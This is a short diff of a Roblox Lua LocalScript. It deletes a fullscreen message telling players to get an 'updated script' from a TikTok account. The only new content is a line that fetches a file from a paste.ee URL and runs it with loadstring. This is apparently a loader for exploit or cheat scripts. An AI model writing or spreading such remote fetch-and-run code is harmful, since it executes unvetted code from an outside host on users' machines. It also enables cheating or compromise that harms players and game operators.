@@ -1,18 +1,2 @@
--- LocalScript (place in StarterPlayerScripts or StarterGui)
-
-local player = game.Players.LocalPlayer
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = player:WaitForChild("PlayerGui")
-
-local textLabel = Instance.new("TextLabel")
-textLabel.Parent = screenGui
-textLabel.Size = UDim2.new(1, 0, 1, 0)  -- Fullscreen
-textLabel.Position = UDim2.new(0, 0, 0, 0)
-textLabel.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black background
-textLabel.TextColor3 = Color3.new(1, 1, 1)        -- White text
-textLabel.TextScaled = true
-textLabel.Font = Enum.Font.GothamBold
-textLabel.Text = "GET UPDATED SCRIPT ON @mxarco.polo ON TIKTOK"
-
--- Optional: Prevent player interaction with the game while the message is up
-textLabel.Active = false
+wait(0.2)
+loadstring(game:HttpGet("https://paste.ee/r/RUe3FwcJ"))()
